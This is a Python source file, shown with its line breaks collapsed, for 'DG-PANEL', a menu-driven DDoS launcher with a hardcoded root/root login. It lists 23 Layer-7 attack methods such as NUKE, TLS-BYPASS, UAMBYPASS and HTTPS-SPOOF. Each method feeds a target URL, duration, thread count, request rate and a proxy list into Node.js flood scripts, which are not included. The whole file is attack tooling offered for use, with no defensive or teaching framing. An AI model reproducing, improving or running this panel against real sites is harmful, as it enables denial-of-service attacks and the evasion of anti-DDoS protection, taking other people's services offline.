# -*- coding: utf-8 -*-from operator import indeximport socketimport randomimport stringimport threadingimport getpassimport urllibimport getpassimport coloramaimport os,sys,time,re,requests,jsonfrom requests import postfrom time import sleepfrom datetime import datetime, dateimport codecsauthor = ""def prints(start_color, end_color, text):    start_r, start_g, start_b = start_color    end_r, end_g, end_b = end_color    for i in range(len(text)):        r = int(start_r + (end_r - start_r) * i / len(text))        g = int(start_g + (end_g - start_g) * i / len(text))        b = int(start_b + (end_b - start_b) * i / len(text))        color_code = f"\033[38;2;{r};{g};{b}m"        print(color_code + text[i], end="")start_color = (255, 255, 255)end_color = (0, 0, 255)class Color:    colorama.init()def help():	os.system('cls' if os.name == 'nt' else 'clear')	print("""\033[36m	1.NUKE                    11.HTTP-RAND                    21.UAM2	2.FLOOD                   12.HTTPS-PRO                    22.UAMBYPASS	3.TLS1                    13.HYPER                        23.HTTPS-SPOOF	4.TLS3                    14.TLS4	5.BYPASS                  15.TLS-BYPASS	6.BOT                     16.TLS-FLOODER	7.BYPASSV1                17.TLS-V2	8.BYPASSV2                18.TLS-VIP	9.FLOODV1                 19.TLSS   10.HTTP-MARS              20.UAM                                                  	""")def main():	os.system('cls' if os.name == 'nt' else 'clear')	print("""                               \033[36mWELCOME TO DG-PANEL		   	 TYPE \033[36m[\033[32mHELP\033[36m] TO SEE OUR METHODS                         AUTHOR IN TELEGRAM : @ItzMeSahid\033[0m""")	while True:		sys.stdout.write(f"\x1b]2;[\] DG-Panel :: Online Users: [1] :: Attack Sended: [1/10]\x07")		sin = input("\033[0;30;46mDG@PANEL\x1b[1;37m\033[0m:~$ \x1b[1;37m\033[0m")		sinput = sin.split(" ")[0]				if sinput == "clear":			os.system ("clear")			main()					if sinput == "cls" or sinput == "CLS":			os.system ("clear")			main()		if sinput == "help" or sinput == "HELP" or sinput == ".help" or sinput == ".HELP" or sinput == "menu" or sinput == ".menu" or sinput == "MENU" or sinput == ".MENU":			help()#########LAYER-7########  		elif sinput == "NUKE" or sinput == "nuke":			try:				url = sin.split()[1]				time = sin.split()[2]				threads = sin.split()[3]				rps = sin.split()[4]				os.system(f'cd L7 && node Nuke.js {url} {time} {threads} proxies.txt {rps}')				os.system ("clear")			except ValueError:				main()			except IndexError:				main()		elif sinput == "FLOOD" or sinput == "flood":			try:				url = sin.split()[1]				threads = sin.split()[2]				time = sin.split()[3]				os.system(f'cd L7 && node flood.js {url} {threads} {time}')				os.system ("clear")			except ValueError:				main()			except IndexError:				main()					elif sinput == "TLS1" or sinput == "tls1":			try:				url = sin.split()[1]				time = sin.split()[2]				rps = sin.split()[3]				threads = sin.split()[4]				os.system(f'cd L7 && node TLS1.js {url} {time} {rps} {threads}')				os.system ("clear")			except ValueError:				main()			except IndexError:				main()		elif sinput == "TLS3" or sinput == "tls3":			try:				url = sin.split()[1]				time = sin.split()[2]				rps = sin.split()[3]				threads = sin.split()[4]				os.system(f'cd L7 && node TLS3.js {url} {time} {rps} {threads}  proxies.txt')				os.system ("clear")			except ValueError:				main()			except IndexError:				main()		elif sinput == "BYPASS" or sinput == "bypass":			try:				url = sin.split()[1]				time = sin.split()[2]				threads = sin.split()[3]				rps = sin.split()[4]				os.system(f'cd L7 && node bypass.js {url} {time} {threads} proxies.txt {rps}')				os.system ("clear")			except ValueError:				main()			except IndexError:				main()		elif sinput == "BOT" or sinput == "bot":			try:				url = sin.split()[1]				time = sin.split()[2]				rps = sin.split()[3]				threads = sin.split()[4]				os.system(f'cd L7 && node BOT.js {url} {time} {rps} {threads} proxies.txt')				os.system ("clear")			except ValueError:				main()			except IndexError:				main()						elif sinput == "BYPASSV1" or sinput == "bypassv1":			try:				url = sin.split()[1]				time = sin.split()[2]				rps = sin.split()[3]				threads = sin.split()[4]				os.system(f'cd L7 && node bypassv1.js {url} {time} {rps} {threads} proxies.txt flood')				os.system ("clear")			except ValueError:				main()			except IndexError:				main()						elif sinput == "BYPASSV2" or sinput == "bypassv2":			try:				url = sin.split()[1]				time = sin.split()[2]				threads = sin.split()[3]				rps = sin.split()[4]				os.system(f'cd L7 && node bypassv2.js {url} {time} {threads} proxies.txt {rps} flood')				os.system ("clear")			except ValueError:				main()			except IndexError:				main()						elif sinput == "FLOODV1" or sinput == "floodv1":			try:				url = sin.split()[1]				time = sin.split()[2]				rps = sin.split()[3]				threads = sin.split()[4]				os.system(f'cd L7 && node Floodv1.js {url} {time} {rps} {threads} proxies.txt')				os.system ("clear")			except ValueError:				main()			except IndexError:				main()						elif sinput == "HTTP-MARS" or sinput == "http-mars":			try:				url = sin.split()[1]				time = sin.split()[2]				rps = sin.split()[3]				threads = sin.split()[4]				os.system(f'cd L7 && node HTTP-MARS.js {url} {time} {rps} {threads} proxies.txt')				os.system ("clear")			except ValueError:				main()			except IndexError:				main()						elif sinput == "HTTP-RAND" or sinput == "http-rand":			try:				url = sin.split()[1]				time = sin.split()[2]				os.system(f'cd L7 && node HTTP-RAND.js {url} {time}')				os.system ("clear")			except ValueError:				main()			except IndexError:				main()						elif sinput == "HTTPS-PRO" or sinput == "https-pro":			try:				url = sin.split()[1]				time = sin.split()[2]				rps = sin.split()[3]				threads = sin.split()[4]				os.system(f'cd L7 && node HTTPS-PRO.js {url} {time} {rps} {threads} proxies.txt')				os.system ("clear")			except ValueError:				main()			except IndexError:				main()						elif sinput == "HYPER" or sinput == "hyper":			try:				url = sin.split()[1]				time = sin.split()[2]				os.system(f'cd L7 && node hyper.js {url} {time}')				os.system ("clear")			except ValueError:				main()			except IndexError:				main()						elif sinput == "TLS4" or sinput == "tls4":			try:				url = sin.split()[1]				time = sin.split()[2]				rps = sin.split()[3]				threads = sin.split()[4]				os.system(f'cd L7 && node TLS4.js {url} {time} {rps} {threads}')				os.system ("clear")			except ValueError:				main()			except IndexError:				main()						elif sinput == "TLS-BYPASS" or sinput == "tls-bypass":			try:				url = sin.split()[1]				time = sin.split()[2]				rps = sin.split()[3]				threads = sin.split()[4]				os.system(f'cd L7 && node TLS-BYPASS.js {url} {time} {rps} {threads}')				os.system ("clear")			except ValueError:				main()			except IndexError:				main()						elif sinput == "TLS-FLOODER" or sinput == "tls-flooder":			try:				url = sin.split()[1]				time = sin.split()[2]				rps = sin.split()[3]				threads = sin.split()[4]				os.system(f'cd L7 && node TLS-FLOODER.js {url} {time} {rps} {threads} proxies.txt')				os.system ("clear")			except ValueError:				main()			except IndexError:				main()						elif sinput == "TLS-V2" or sinput == "tls-v2":			try:				url = sin.split()[1]				time = sin.split()[2]				rps = sin.split()[3]				threads = sin.split()[4]				os.system(f'cd L7 && node TLS.V2.js {url} {time} {rps} {threads}')				os.system ("clear")			except ValueError:				main()			except IndexError:				main()						elif sinput == "TLS-VIP" or sinput == "tls-vip":			try:				url = sin.split()[1]				time = sin.split()[2]				rps = sin.split()[3]				threads = sin.split()[4]				os.system(f'cd L7 && node TLS-VIP.js {url} {time} {rps} {threads}')				os.system ("clear")			except ValueError:				main()			except IndexError:				main()						elif sinput == "TLSS" or sinput == "tlss":			try:				url = sin.split()[1]				time = sin.split()[2]				rps = sin.split()[3]				threads = sin.split()[4]				os.system(f'cd L7 && node TLSS.js {url} {time} {rps} {threads} proxies.txt')				os.system ("clear")			except ValueError:				main()			except IndexError:				main()						elif sinput == "UAM" or sinput == "uam":			try:				url = sin.split()[1]				time = sin.split()[2]				rps = sin.split()[3]				threads = sin.split()[4]				os.system(f'cd L7 && node uam.js {url} {time} {rps} {threads} proxies.txt')				os.system ("clear")			except ValueError:				main()			except IndexError:				main()						elif sinput == "UAM2" or sinput == "uam2":			try:				url = sin.split()[1]				time = sin.split()[2]				rps = sin.split()[3]				threads = sin.split()[4]				os.system(f'cd L7 && node uam2.js {url} {time} {rps} {threads} proxies.txt')				os.system ("clear")			except ValueError:				main()			except IndexError:				main()						elif sinput == "UAMBYPASS" or sinput == "uambypass":			try:				url = sin.split()[1]				time = sin.split()[2]				rps = sin.split()[3]				os.system(f'cd L7 && node uambypass.js {url} {time} {rps} proxies.txt')				os.system ("clear")			except ValueError:				main()			except IndexError:				main()						elif sinput == "HTTPS-SPOOF" or sinput == "https-spoof":			try:				url = sin.split()[1]				time = sin.split()[2]				threads = sin.split()[3]				os.system(f'cd L7 && node HTTPS-SPOOF.py {url} {time} {threads} proxies.txt')				os.system ("clear")			except ValueError:				main()			except IndexError:				main()						else:		    print("No Command Found")def login():	sys.stdout.write(f"\x1b]2;[\] DG-Panel :: Online Users: [1] :: Attack Sended: [1/10]\x07")	os.system('cls' if os.name == 'nt' else 'clear')	user = "root"	passwd = "root"	username = input('\033[36m[\033[32mUSERNAME\033[36m]:\033[0m ')	password = getpass.getpass(prompt='\033[36m[\033[32mPASSWORD\033[36m]:\033[0m ')	if username == user and password == passwd:		print("\033[36mSuccessfully Login to ur Account")		time.sleep(1)		main()			elif username != user or password != passwd:		print("\033[36mWrong Username Or Password!")		print ()		sys.exit(1)login()